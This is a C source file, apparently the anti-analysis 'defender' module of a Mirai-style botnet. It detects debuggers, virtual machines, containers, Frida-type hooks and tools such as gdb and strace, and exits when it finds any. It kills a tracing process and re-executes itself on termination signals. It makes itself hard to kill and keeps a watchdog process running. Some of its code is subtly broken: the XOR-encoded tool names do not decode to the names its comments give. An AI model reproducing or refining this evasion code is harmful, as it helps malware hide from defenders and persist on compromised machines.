#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
#include <sys/stat.h>
#include <dirent.h>
#include <stdint.h>
#include <dirent.h>

#include "includes.h"
#include "defender.h"
#include "table.h"
#include "util.h"

static uint32_t self_checksum = 0;

/* XOR-obfuscated RE tool names */
static const unsigned char re_names[][12] = {
    {0x8f,0x84,0x84,0x00},           /* gdb  ^ 0xe7 */
    {0x94,0x91,0x93,0x83,0x87,0x00}, /* strace ^ 0xe7 */
    {0x95,0x91,0x83,0x93,0x87,0x00}, /* ltrace ^ 0xe7 */
    {0x8f,0x84,0x96,0x94,0x83,0x90,0x00}, /* objdump ^ 0xe7 */
    {0x93,0x87,0x83,0x90,0x87,0x8c,0x00}, /* readelf ^ 0xe7 */
    {0x94,0x91,0x93,0x8e,0x88,0x94,0x00}, /* strings ^ 0xe7 */
};

static void deobf_str(const unsigned char *obf, char *out, int max)
{
    int i;
    for (i = 0; obf[i] != 0 && i < max - 1; i++)
        out[i] = (char)(obf[i] ^ 0xe7);
    out[i] = 0;
}

static void defender_rexec(int sig)
{
    (void)sig;
    if (access("/proc/self/exe", X_OK) == 0)
    {
        char *argv[] = {"/proc/self/exe", NULL};
        execv("/proc/self/exe", argv);
    }
    _exit(0);
}

static int check_cpu_count(void)
{
    int cpus = 0;
    DIR *d;
    struct dirent *e;

    d = opendir("/sys/devices/system/cpu");
    if (!d) return 0;
    while ((e = readdir(d)))
    {
        if (strncmp(e->d_name, "cpu", 3) == 0 &&
            e->d_name[3] >= '0' && e->d_name[3] <= '9')
            cpus++;
    }
    closedir(d);
    if (cpus > 0 && cpus <= 2) return 1;
    return 0;
}

static int check_container(void)
{
    char buf[2048];
    int fd;

    /* cgroup detection */
    fd = open("/proc/1/cgroup", O_RDONLY);
    if (fd != -1)
    {
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0)
        {
            buf[n] = 0;
            if (strstr(buf, "docker") || strstr(buf, "lxc") ||
                strstr(buf, "kubepods") || strstr(buf, "containerd") ||
                strstr(buf, "libpod") || strstr(buf, "system.slice"))
                return 1;
        }
    }

    /* /.dockerenv */
    if (access("/.dockerenv", F_OK) == 0) return 1;

    /* LXC / hypervisor devices */
    if (access("/dev/xen", F_OK) == 0) return 1;
    if (access("/dev/vboxguest", F_OK) == 0) return 1;
    if (access("/dev/vboxuser", F_OK) == 0) return 1;
    if (access("/proc/xen", F_OK) == 0) return 1;

    /* XEN hypervisor */
    fd = open("/sys/hypervisor/type", O_RDONLY);
    if (fd != -1)
    {
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0)
        {
            buf[n] = 0;
            if (strstr(buf, "xen") || strstr(buf, "Xen")) return 1;
        }
    }

    return 0;
}

static int check_vmtoolsd(void)
{
    DIR *d;
    struct dirent *e;
    char path[64], *ptr;

    table_unlock_val(TABLE_KILLER_PROC);
    d = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    if (!d) return 0;

    while ((e = readdir(d)))
    {
        if (*(e->d_name) < '0' || *(e->d_name) > '9') continue;

        ptr = path;
        table_unlock_val(TABLE_KILLER_PROC);
        table_unlock_val(TABLE_KILLER_COMM);
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
        ptr += util_strcpy(ptr, e->d_name);
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_COMM, NULL));
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_COMM);

        {
            int fd = open(path, O_RDONLY);
            if (fd != -1)
            {
                char buf[64];
                int n = read(fd, buf, sizeof(buf) - 1);
                close(fd);
                if (n > 0)
                {
                    buf[n] = 0;
                    if (strstr(buf, "vmtoolsd") || strstr(buf, "VBoxService") ||
                        strstr(buf, "qemu-ga") || strstr(buf, "xenstore"))
                    {
                        closedir(d);
                        return 1;
                    }
                }
            }
        }
    }
    closedir(d);
    return 0;
}

static int check_analysis_libs(void)
{
    int fd = open("/proc/self/maps", O_RDONLY);
    if (fd == -1) return 0;
    {
        char buf[4096];
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0)
        {
            buf[n] = 0;
            if (strstr(buf, "libfrida") || strstr(buf, "frida-agent") ||
                strstr(buf, "libcycript") || strstr(buf, "libsubstrate") ||
                strstr(buf, "libhook") || strstr(buf, "libinject") ||
                strstr(buf, "libdbi") || strstr(buf, "libpintool"))
                return 1;
        }
    }
    return 0;
}

static void kill_tracer_process(void)
{
    char buf[512];
    char *tp;
    int fd, n;
    fd = open("/proc/self/status", O_RDONLY);
    if (fd == -1) return;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return;
    buf[n] = 0;
    tp = strstr(buf, "TracerPid:");
    if (tp)
    {
        int tpid = atoi(tp + 10);
        if (tpid > 1)
        {
            kill(tpid, SIGSTOP);
            usleep(10000);
            kill(tpid, SIGKILL);
        }
    }
}

static void anti_analysis(void)
{
    char buf[1024];
    char *tp;
    int fd;

    fd = open("/proc/self/status", O_RDONLY);
    if (fd != -1)
    {
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0)
        {
            buf[n] = 0;
            tp = strstr(buf, "TracerPid:");
            if (tp && atoi(tp + 10) != 0)
                _exit(0);
        }
    }

    fd = open("/proc/cpuinfo", O_RDONLY);
    if (fd != -1)
    {
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0)
        {
            buf[n] = 0;
            if (strstr(buf, "QEMU") || strstr(buf, "VirtualBox") || strstr(buf, "VMware") || strstr(buf, "KVM") || strstr(buf, "Bochs"))
                _exit(0);
        }
    }

    fd = open("/sys/class/dmi/id/product_name", O_RDONLY);
    if (fd != -1)
    {
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0)
        {
            buf[n] = 0;
            if (strstr(buf, "VMware") || strstr(buf, "VirtualBox") || strstr(buf, "KVM") || strstr(buf, "QEMU") || strstr(buf, "Bochs"))
                _exit(0);
        }
    }

    fd = open("/sys/class/dmi/id/sys_vendor", O_RDONLY);
    if (fd != -1)
    {
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0)
        {
            buf[n] = 0;
            if (strstr(buf, "VMware") || strstr(buf, "VirtualBox") || strstr(buf, "QEMU") || strstr(buf, "innotek") || strstr(buf, "Bochs"))
                _exit(0);
        }
    }

    prctl(PR_SET_DUMPABLE, 0);

    {
        struct sigaction sa;
        sa.sa_handler = defender_rexec;
        sa.sa_flags = SA_RESTART;
        sigfillset(&sa.sa_mask);
        sigaction(SIGTERM, &sa, NULL);
        sigaction(SIGHUP, &sa, NULL);
        sigaction(SIGINT, &sa, NULL);
        sigaction(SIGQUIT, &sa, NULL);
    }

    prctl(PR_SET_PDEATHSIG, 0);

#ifndef PR_SET_PTRACER
#define PR_SET_PTRACER 0x59616d61
#endif
    prctl(PR_SET_PTRACER, 0);

    fd = open("/proc/self/oom_score_adj", O_WRONLY);
    if (fd != -1)
    {
        write(fd, "-1000", 5);
        close(fd);
    }

    fd = open("/proc/self/environ", O_RDONLY);
    if (fd != -1)
    {
        int n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n > 0)
        {
            buf[n] = 0;
            if (strstr(buf, "LD_PRELOAD=") || strstr(buf, "LD_LIBRARY_PATH="))
                _exit(0);
        }
    }

#if defined(__x86_64__) || defined(__i386__) || defined(__i686__)
    {
        uint64_t tsc1, tsc2;
        uint32_t lo, hi;
        __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
        tsc1 = ((uint64_t)hi << 32) | lo;
        __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
        tsc2 = ((uint64_t)hi << 32) | lo;
        if ((tsc2 - tsc1) > 5000)
            _exit(0);
    }
#endif
}

static void compute_self_checksum(void)
{
    int fd = open("/proc/self/exe", O_RDONLY);
    if (fd != -1)
    {
        char rdbuf[4096];
        ssize_t n;
        uint32_t cs = 0;
        while ((n = read(fd, rdbuf, sizeof(rdbuf))) > 0)
        {
            ssize_t i;
            for (i = 0; i < n; i++)
            {
                cs = (cs << 7) | (cs >> 25);
                cs ^= (unsigned char)rdbuf[i];
            }
        }
        close(fd);
        self_checksum = cs;
    }
}

static int check_self_integrity(void)
{
    if (self_checksum == 0) return 0;
    {
        int fd = open("/proc/self/exe", O_RDONLY);
        if (fd == -1) return 1;
        {
            char rdbuf[4096];
            ssize_t n;
            uint32_t cs = 0;
            while ((n = read(fd, rdbuf, sizeof(rdbuf))) > 0)
            {
                ssize_t i;
                for (i = 0; i < n; i++)
                {
                    cs = (cs << 7) | (cs >> 25);
                    cs ^= (unsigned char)rdbuf[i];
                }
            }
            close(fd);
            return cs != self_checksum;
        }
    }
}

static int check_tracerpid(void)
{
    char buf[512];
    char *tp;
    int fd, n;
    fd = open("/proc/self/status", O_RDONLY);
    if (fd == -1) return 0;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = 0;
    tp = strstr(buf, "TracerPid:");
    if (tp && atoi(tp + 10) != 0)
        return 1;
    return 0;
}

static int check_re_tools(void)
{
    DIR *d;
    struct dirent *e;
    char p[64], *ptr;
    int fd;
    char buf[64];
    int found = 0;

    table_unlock_val(TABLE_KILLER_PROC);
    d = opendir(table_retrieve_val(TABLE_KILLER_PROC, NULL));
    table_lock_val(TABLE_KILLER_PROC);

    if (!d) return 0;

    while ((e = readdir(d)) && !found)
    {
        if (*(e->d_name) < '0' || *(e->d_name) > '9') continue;

        ptr = p;
        table_unlock_val(TABLE_KILLER_PROC);
        table_unlock_val(TABLE_KILLER_COMM);
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
        ptr += util_strcpy(ptr, e->d_name);
        ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_COMM, NULL));
        table_lock_val(TABLE_KILLER_PROC);
        table_lock_val(TABLE_KILLER_COMM);

        fd = open(p, O_RDONLY);
        if (fd < 0) continue;
        {
            int n = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (n > 0)
            {
                int ri;
                buf[n] = 0;
                {
                    char *nl = strchr(buf, '\n');
                    if (nl) *nl = 0;
                }
                for (ri = 0; ri < (int)(sizeof(re_names) / sizeof(re_names[0])); ri++)
                {
                    char deobf[32];
                    deobf_str(re_names[ri], deobf, sizeof(deobf));
                    if (strstr(buf, deobf))
                    {
                        found = 1;
                        break;
                    }
                }
            }
        }
    }
    closedir(d);
    return found;
}

static int check_mem_regions(void)
{
    int fd;
    char buf[4096];
    ssize_t n;
    fd = open("/proc/self/maps", O_RDONLY);
    if (fd == -1) return 0;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = 0;
    {
        char *line = buf;
        while (line)
        {
            char *nl = strchr(line, '\n');
            if (nl) *nl = 0;
            if (strstr(line, "rwx"))
            {
                return 1;
            }
            if (nl)
            {
                *nl = '\n';
                line = nl + 1;
            }
            else
                break;
        }
    }
    return 0;
}

void defender_init(void)
{
    anti_analysis();
    compute_self_checksum();

    {
        pid_t wd = fork();
        if (wd == 0)
        {
            while (1)
            {
                if (check_tracerpid())
                {
                    kill_tracer_process();
                    _exit(0);
                }
                if (check_re_tools() || check_mem_regions() || check_self_integrity() ||
                    check_container() || check_vmtoolsd() || check_cpu_count() ||
                    check_analysis_libs())
                {
                    _exit(0);
                }
                sleep(5);
            }
        }
    }
}

void defender_tick(void)
{
    if (check_tracerpid())
    {
        kill_tracer_process();
        _exit(0);
    }
    if (check_re_tools() || check_mem_regions() || check_self_integrity() ||
        check_container() || check_vmtoolsd() || check_cpu_count() ||
        check_analysis_libs())
    {
        _exit(0);
    }
}
